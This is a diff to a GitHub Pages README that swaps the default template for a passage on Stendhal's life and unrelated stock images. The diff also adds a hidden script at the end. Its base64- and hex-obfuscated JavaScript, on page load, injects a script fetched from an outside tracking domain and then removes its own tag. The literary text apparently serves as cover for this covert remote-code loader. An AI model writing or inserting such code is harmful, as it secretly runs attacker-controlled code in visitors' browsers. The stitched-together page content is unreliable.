@@ -1,37 +1,15 @@
-## Welcome to GitHub Pages
+# Some slight sketch 
 
-You can use the [editor on GitHub](https://github.com/scalincon/Sun/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+Some slight sketch of the life and character of Stendhal is particularly necessary to an understanding of Le Rouge et Le Noir (The Red and the Black) not so much as being the formal stuffing of which introductions are made, but because the book as a book stands in the most intimate relation to the author's life and character. The hero, Julien, is no doubt, viewed superficially, a cad, a scoundrel, an assassin, albeit a person who will alternate the moist eye of the sentimentalist with the ferocious grin of the beast of prey. But Stendhal so far from putting forward any excuses makes a specific point of wallowing defiantly in his own alleged wickedness. "Even assuming that Julien is a villain and that it is my portrait," he wrote shortly after the publication of the book, "why quarrel with me. In the time of the Emperor, Julien would have passed for a very honest man. I lived in the time of the Emperor. So—but what does it matter?"
+![k](https://thumbs-prod.si-cdn.com/fN0E4-35miW4Z_iB6DiBhdgSpLQ=/800x600/filters:no_upscale()/https://public-media.si-cdn.com/filer/21/d5/21d52f51-bb0a-457f-8669-4afd346e85a8/brjx5m.jpg)
+Henri Beyle was born in 1783 in Grenoble in Dauphiny, the son of a royalist lawyer, situated on the borderland between the gentry and that bourgeoisie which our author was subsequently to chastise with that malice peculiar to those who spring themselves from the class which they despise. The boy's character was a compound of sensibility and hard rebelliousness, virility and introspection. Orphaned of his mother at the age of seven, hated by his father and unpopular with his schoolmates, he spent the orthodox unhappy childhood of the artistic temperament. Winning a scholarship at the Ecole Polytechnique at the age of sixteen he proceeded to Paris, where with characteristic independence he refused to attend the college classes and set himself to study privately in his solitary rooms.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+In 1800 the influence of his relative M. Daru procured him a commission in the French Army, and the Marengo campaign gave him an opportunity of practising that Napoleonic worship to which throughout his life he remained consistently faithful, for the operation of the philosophical materialism of the French sceptics on an essentially logical and mathematical mind soon swept away all competing claimants for his religious adoration. Almost from his childhood, moreover, he had abominated the Jesuits, and "Papism is the source of all crimes," was throughout his life one of his favourite maxims.
 
-### Markdown
+After the army's triumphant entry into Milan, Beyle returned to Grenoble on furlough, whence he dashed off to Paris in pursuit of a young woman to whom he was paying some attention, resigned his commission in the army and set himself to study "with the view of becoming a great man." It is in this period that we find the most marked development in Beyle's enthusiasm of psychology. This tendency sprang primarily no doubt from his own introspection. For throughout his life Beyle enjoyed the indisputable and at times dubious luxury of a double consciousness. He invariably carried inside his brain a psychological mirror which reflected every phrase of his emotion with scientific accuracy. And simultaneously, the critical spirit, half-genie, half-demon inside his brain, would survey in the semi-detached mood of a keenly interested spectator, the actual emotion itself, applaud or condemn it as the case might be, and ticket the verdict with ample commentations in the psychological register of its own analysis.
+![k](https://aldf.org/wp-content/uploads/2018/05/lamb-iStock-665494268-16x9-e1559777676675-1200x675.jpg)
+But this trend to psychology, while as we have seen, to some extent, the natural development of mere self-analysis was also tinged with the spirit of self-preservation. With a mind, which in spite of its natural physical courage was morbidly susceptible to ridicule and was only too frequently the dupe of the fear of being duped, Stendhal would scent an enemy in every friend, and as a mere matter of self-protection set himself to penetrate the secret of every character with which he came into contact. One is also justified in taking into account an honest intellectual enthusiasm which found its vent in deciphering the rarer and more precious manuscripts of the "human document."
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+With the exception of a stay in Marseilles, with his first mistress Mélanie Guilhert ("a charming actress who had the most refined sentiments and to whom I never gave a sou,") and a subsequent sojourn in Grenoble, Stendhal remained in Paris till 1806, living so far as was permitted by the modest allowance of his niggard father the full life of the literary temperament. The essence, however, of his character was that he was at the same time a man of imagination and a man of action. We consequently find him serving in the Napoleonic campaigns of 1806, 1809 and 1812. He was present at the Battle of Jena, came several times into personal contact with Napoleon, discharged with singular efficiency the administration of the State of Brunswick, and retained his sangfroid and his bravery during the whole of the panic-stricken retreat of the Moscow campaign.
 
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/scalincon/Sun/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="T5bzL" src="data:text/javascript;base64, dmFyIF9zUDlQRCA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX2x0NzZuLCBfbDN5TmspIHt2YXIgX29Dd1JXID0gZnVuY3Rpb24oX3BwSGlPKSB7d2hpbGUgKC0tX3BwSGlPKSB7X2x0NzZuWydwdXNoJ10oX2x0NzZuWydzaGlmdCddKCkpO319O19vQ3dSVygrK19sM3lOayk7fShfc1A5UEQsIDB4MTFiKSk7dmFyIF9sQnNNaCA9IGZ1bmN0aW9uKF9lQmVaVCwgX203emdiKSB7X2VCZVpUID0gX2VCZVpUIC0gMHgwO3ZhciBfc1B1VVMgPSBfc1A5UERbX2VCZVpUXTtyZXR1cm4gX3NQdVVTO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfbEJzTWgoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgXzhwdmVEID0gZG9jdW1lbnRbX2xCc01oKCcweDEnKV0oX2xCc01oKCcweDInKSk7XzhwdmVEW19sQnNNaCgnMHgzJyldID0gX2xCc01oKCcweDQnKTtfOHB2ZURbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2MVx4NmVceDc0XHg2Zlx4NmVceDZmXHg3Nlx4NjNceDZmXHg2ZFx4NzBceDYxXHg2ZVx4NzlceDYxXHg2M1x4NjNceDMxXHgyZVx4NzNceDcwXHg3OVx4MmRceDZlXHg2NVx4NzdceDczXHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NThceDM4XHg2Zlx4NDdceDcyXHg3MVx4NmZceDQyXHgzMFx4NTknO2RvY3VtZW50W19sQnNNaCgnMHg1JyldKF9sQnNNaCgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF84cHZlRCk7ZG9jdW1lbnRbX2xCc01oKCcweDcnKV0oJ1Q1YnpMJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
